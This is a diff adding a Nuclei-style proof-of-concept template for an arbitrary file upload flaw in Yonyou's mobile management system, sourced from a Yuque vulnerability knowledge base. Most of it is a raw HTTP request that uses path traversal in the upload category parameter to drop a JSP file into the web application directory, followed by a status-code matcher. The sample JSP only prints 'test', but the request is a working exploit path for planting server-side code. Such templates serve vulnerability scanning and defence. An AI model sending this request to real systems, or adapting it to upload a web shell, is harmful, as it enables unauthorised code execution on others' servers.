@@ -1,0 +1,62 @@
+id: poc-dnw99mh6tn9lk40p
+info:
+  name: 用友 移动管理系统 common任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dnw99mh6tn9lk40p'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dnw99mh6tn9lk40p
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /mobsm/common/upload?category=../webapps/nc_web/maupload/img HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+
+    Cache-Control: no-cache
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+
+    Content-Disposition: form-data; name="file"; filename="123.jsp"
+
+
+    Content-Type: text/plain
+
+
+
+
+    <% out.println("test");%>
+
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .jsp
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
